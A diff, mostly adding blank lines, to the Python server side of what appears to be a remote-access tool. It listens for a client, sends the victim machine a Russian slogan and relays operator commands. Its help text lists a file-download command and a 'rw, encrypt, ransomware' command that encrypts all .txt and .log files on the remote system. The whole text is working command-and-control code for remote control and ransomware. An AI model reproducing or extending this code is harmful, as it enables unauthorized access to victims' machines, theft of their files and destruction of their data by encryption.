@@ -26,11 +26,11 @@ s.listen(1)
 
 # Waiting for input
 while True:
-
     print(f'[*] listening as {HOST}:{PORT}')
     client = s.accept()
     print(f'[*] Client connected {client[1]}')
     client[0].send('Наше дело правое, победа будет за нами!'.encode())
+
 
     while True:
         # cmd = input('╰─➤ ')
@@ -39,12 +39,15 @@ while True:
         # cmd = input('>>> ')
         client[0].send(cmd.encode())
 
+
         if cmd.lower() in ['q', 'quit', 'x', 'exit']:
             break
+
 
         if cmd.lower() in ['h', 'help']:
             print('[h, help] Displays this help\n[down. download] Usage <down> lets you download files from the remote System\n[rw, encrypt, ransomware] Usage <rw, encrypt, ransomware> encrypts all .txt, .log files on the remote system, you can add more extensions if you want')
             continue
+
 
         # This will close the connection because tcp doesnt know when the end of the file is reached so it keeps waiting for data which means the shell cannot be used anymore and it has to be killed
         if cmd.lower() in ['down', 'download']:
@@ -73,6 +76,7 @@ while True:
                 client[0].send('n'.encode())
                 continue
 
+
         if cmd.lower() in ['rw', 'encrypt', 'ransomware']:
             if client[0].recv(1024).decode() == 'nnt':
                 print('The Target isnt on Windows...')
@@ -84,20 +88,25 @@ while True:
                 print(output)
                 sys.stderr = object
 
+
         # To add your own command remove the # below and change alias with the command alias and command with the command name
         # Make sure to add it to Client.py as well
         # if cmd.lower() in ['alias', 'command']:   
             # output = client[0].recv(1024).decode()
             # print(f'your text here {output}')
 
+
         result = client[0].recv(1024).decode()
         print(result)
 
+
     client[0].close()
+
 
     cmd = input('Wait for new client Y/n ') or 'y'
     print("\033c", end='')
     if cmd.lower() in ['n', 'no']:
         break
+
 
 s.close()
